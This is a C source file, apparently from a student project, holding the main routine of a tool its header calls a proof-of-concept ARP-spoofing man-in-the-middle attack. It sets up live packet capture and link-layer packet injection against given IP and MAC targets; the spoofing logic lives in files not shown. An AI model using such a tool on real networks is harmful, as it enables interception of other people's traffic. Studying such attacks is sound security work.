/**
 * @file    inquisitor.c
 * @author  Ernesto Martínez Gómez (@ernestomgz),
 *          Antonio J. Galán Herrera (@15Galan)
 * @brief   Proof of Concept of a 'Man In The Middle' attack ('ARP Spoofing').
 * @date    2022-08-17
 * @version 0.1
 */


#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <pcap.h>
#include <libnet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <libnet.h>

#include "packetManage.h"
#include "utils.h"
#include "targets.h"



int main(int argc,char *argv[]){
	// TODO: verbose mode ('-v')
	// Check arguments cuantity.
	if (argc != 5) {
		printf("Usage: %s <Source IP> <Source MAC> <Destination IP> <Destination MAC>\n", argv[0]);
		exit(0);
	}
	char error_buffer[PCAP_ERRBUF_SIZE];    // Buffer to capture errors for libpcap
	char errbuf[LIBNET_ERRBUF_SIZE];       // Buffer to capture errors for libnet
	int timeout_limit = 100;              // Timeout limit (in ms)
	int snapshot_length = 1024;             // How many bytes to capture
	int total_packet_count = 0;           // How many packets to capture


	/* automatically detects the device(eth0 or other) */
	pcap_if_t* alldevs;
	int devStatus = pcap_findalldevs(&alldevs, error_buffer); 
	printf("dev is : %s\n",alldevs->name);

	if (devStatus==-1) {
		printf("Error finding device: %s\n", error_buffer);
		return 1;
	}


	/* Open device for live capture */
	pcap_t *handle = pcap_open_live(alldevs->name,snapshot_length,0,timeout_limit,error_buffer);

	/* Create a contex for libnet */
	libnet_t *l = libnet_init(LIBNET_LINK,alldevs->name,errbuf);

	/* Initialize all targets */
	construct_targets(l,argc,argv);

	/* loop to capture packets */
	u_char *my_arguments=NULL;
	pcap_loop(handle, total_packet_count, my_packet_handler, my_arguments);

	/* free devices */
	pcap_freealldevs(alldevs);

	return 0;
}
